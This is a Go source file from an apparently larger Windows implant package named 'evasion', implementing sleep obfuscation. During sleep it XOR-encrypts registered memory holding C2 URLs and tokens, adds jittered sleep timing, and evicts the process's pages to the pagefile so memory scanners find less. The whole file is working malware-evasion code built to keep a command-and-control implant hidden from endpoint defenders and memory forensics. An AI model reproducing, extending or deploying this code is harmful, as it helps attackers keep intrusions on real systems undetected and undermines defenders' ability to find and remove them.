//go:build windows
// +build windows

package evasion

import (
	"crypto/rand"
	"math/big"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modPsapi               = windows.NewLazySystemDLL("psapi.dll")
	procEmptyWorkingSet    = modPsapi.NewProc("EmptyWorkingSet")
	procGetCurrentProcess2 = modKernel32.NewProc("GetCurrentProcess")
)

// sensitiveRegions holds byte slices that contain sensitive strings
// (C2 URLs, tokens, etc.). They are XOR-obfuscated during sleep.
var (
	sensitiveRegionsMu sync.Mutex
	sensitiveRegions   [][]byte
	obfuscateKey       [32]byte // random, generated at init
)

func init() {
	rand.Read(obfuscateKey[:])
}

// RegisterSensitiveRegion adds a byte slice to be XOR-obfuscated during sleep.
func RegisterSensitiveRegion(region []byte) {
	sensitiveRegionsMu.Lock()
	defer sensitiveRegionsMu.Unlock()
	sensitiveRegions = append(sensitiveRegions, region)
}

func xorRegions() {
	sensitiveRegionsMu.Lock()
	defer sensitiveRegionsMu.Unlock()
	for _, r := range sensitiveRegions {
		for i := range r {
			r[i] ^= obfuscateKey[i%len(obfuscateKey)]
		}
	}
}

// jitter returns a duration within ±30% of base, using crypto/rand.
func jitter(base time.Duration) time.Duration {
	// range: [0, base*60/100)  → shift to [-base*30/100, +base*30/100)
	rangePct := int64(base) * 60 / 100
	if rangePct <= 0 {
		return base
	}
	n, err := rand.Int(rand.Reader, big.NewInt(rangePct))
	if err != nil {
		return base
	}
	return base + time.Duration(n.Int64()-rangePct/2)
}

// trimWorkingSet evicts as many pages as possible to the pagefile so
// memory scanners find fewer resident pages.
func trimWorkingSet() {
	hProc, _, _ := procGetCurrentProcess2.Call()
	if hProc != 0 {
		procEmptyWorkingSet.Call(hProc)
	}
	// Fallback via SetProcessWorkingSetSizeEx with QUOTA_LIMITS_HARDWS_MIN_DISABLE
	modKernel32.NewProc("SetProcessWorkingSetSizeEx").Call(
		hProc,
		^uintptr(0), // SIZE_T(-1)
		^uintptr(0),
		0,
	)
}

// ObfuscatedSleep sleeps for d (±30% jitter) while:
//  1. XOR-obfuscating registered sensitive regions with a random key
//  2. Trimming the process working set from RAM
//
// On wake the regions are restored in-place.
func ObfuscatedSleep(d time.Duration) {
	actual := jitter(d)
	xorRegions()
	trimWorkingSet()
	time.Sleep(actual)
	xorRegions() // decrypt: XOR is its own inverse
	_ = unsafe.Sizeof(uintptr(0))
}
